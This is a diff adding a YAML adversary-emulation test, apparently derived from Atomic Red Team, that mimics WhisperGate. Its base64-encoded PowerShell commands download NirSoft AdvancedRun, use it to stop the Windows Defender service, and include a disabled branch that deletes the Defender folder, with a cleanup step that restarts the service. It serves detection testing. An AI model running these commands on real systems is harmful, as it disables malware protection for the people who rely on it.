@@ -1,0 +1,28 @@
+- id: 52603dc7-091e-5c6c-816f-7e3d4cd3f876
+  name: Soumaia ART Tests - Disable Defender Using NirSoft AdvancedRun
+  description: 'Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html
+
+    This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.
+
+    See https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3
+
+    Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. (requires elevation)'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACgAVABlAHMAdAAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAQQBkAHYAYQBuAGMAZQBkAFIAdQBuAC4AZQB4AGUAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAHcAdwB3AC4AbgBpAHIAcwBvAGYAdAAuAG4AZQB0AC8AdQB0AGkAbABzAC8AYQBkAHYAYQBuAGMAZQBkAHIAdQBuAC4AegBpAHAAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABhAGQAdgBhAG4AYwBlAGQAcgB1AG4ALgB6AGkAcAAiAAoARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAALQBwAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAGEAZAB2AGEAbgBjAGUAZAByAHUAbgAuAHoAaQBwACIAIAAtAGQAZQBzAHQAaQBuAGEAdABpAG8AbgBwAGEAdABoACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwAiACAALQBGAG8AcgBjAGUACgA=
+          }
+          Try {cmd /c "$env:TEMP\ART-ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
+          if(0){
+            $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
+            Try {cmd /c "$env:TEMP\ART-ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
+          }
+        cleanup: |-
+          Try {cmd /c "$env:TEMP\ART-ExternalPayloads\AdvancedRun.exe" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
